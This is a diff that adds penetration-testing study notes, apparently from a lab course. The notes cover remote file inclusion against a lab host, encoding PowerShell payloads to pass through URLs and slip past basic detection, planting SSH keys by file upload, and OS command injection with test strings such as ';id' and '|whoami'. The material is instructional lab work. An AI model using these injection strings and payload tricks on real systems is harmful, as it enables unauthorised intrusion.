@@ -171,3 +171,63 @@ curl "http://mountaindesserts.local/meteor/index.php?page=http://<your.ip>/simpl
 
 ---
 
+
+### Side Notes
+
+URL encoding — needed when passing payloads through a URL (cmd= parameter). Special characters like &, >, spaces break the URL. Always URL encode when going through a web request.
+Base64 encoding — needed for PowerShell specifically because:
+
+PowerShell's -enc flag accepts Base64 natively
+Avoids issues with quotes and special characters in PowerShell syntax
+Bypasses some basic detection
+
+The practical decision tree:
+Executing via URL parameter?
+└── Yes → URL encode the payload
+
+Payload is PowerShell?
+└── Yes → Base64 encode first, then URL encode the whole thing
+
+Simple command like whoami or dir?
+└── Just URL encode spaces and special characters
+So for a Windows web target with PowerShell — you typically do both:
+
+Base64 encode the PowerShell payload
+URL encode the powershell -enc <base64> command before passing via cmd=
+
+
+---
+
+
+## Using non-executable Files
+
+Upload your SSH public key and connect to the machine via your private key. If SSH port is open.
+
+
+---
+
+
+## 9.4.1 OS command injection
+
+**OS Command Injection** — when a web application passes user input directly into a system shell command without proper sanitization, allowing you to inject and execute your own OS commands.
+
+**Conditions needed:**
+1. The app executes system commands on the backend (common in features like ping, DNS lookup, file conversion, archive creation, git operations)
+2. User input is included in that command without sanitization
+3. You can inject command chaining characters (`;`, `&&`, `|`, `||`)
+
+**How to identify it:**
+- Features that feel like they're "doing something" on the server — archiving, converting, checking connectivity
+- URL parameters or form fields that take filenames, URLs, IP addresses, or domain names
+- Error messages that look like shell output
+
+**Quick test:**
+Inject `;id` or `&&whoami` and see if OS command output appears in the response.
+
+**Classic example from your labs:**
+The git archive endpoint — it took a URL and passed it to a `git clone` command. Injecting `|whoami` confirmed command injection.
+
+Conditions in one line: **user input + shell execution + no sanitization = command injection**.
+
+
+---
